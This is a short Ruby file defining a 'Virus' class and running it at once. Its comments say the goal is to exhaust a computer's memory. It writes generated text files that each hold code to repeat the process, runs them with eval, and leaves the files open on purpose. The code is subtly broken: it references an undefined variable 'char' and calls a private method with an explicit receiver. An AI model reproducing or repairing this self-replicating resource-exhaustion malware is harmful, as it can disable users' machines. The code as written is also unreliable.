class Virus
	def initialize
		@num = 1
	end
	private
	#Generate file names
	def gen i
		str = []
		chars = "abcdefghijklmnopqrstuvwxyz0123456789_"
		while i > 0
			str << char[i % char.length].chr
			i /= chars.length
		end
		return str.reverse
	end
	#Change the file names
	def genFileNames
		@x = self.gen(@num).join()
		@num += 1
		return @x
	end
	public
	#Exhaust the memory by creating tons of files that execute themselves
	def spread!
	#Get file Name: see line #7
		name = self.genFileNames
		#Create a file with e generated name
		start = File.new("#{name}.txt", "w+")
		#Set the file content to an assignment to do the whole thing again
		start.puts("x = Virus.new")
		start.puts("x.spread!")
		#Read the file
		recur = File.read("#{name}.txt")
		# - Execute it
		# - Doesn't close the files,
		#	for the enhancement of the de-enhancement of the computer's memory
		eval recur
	end
end
#AND START IT UP!
run = Virus.new
run.spread!
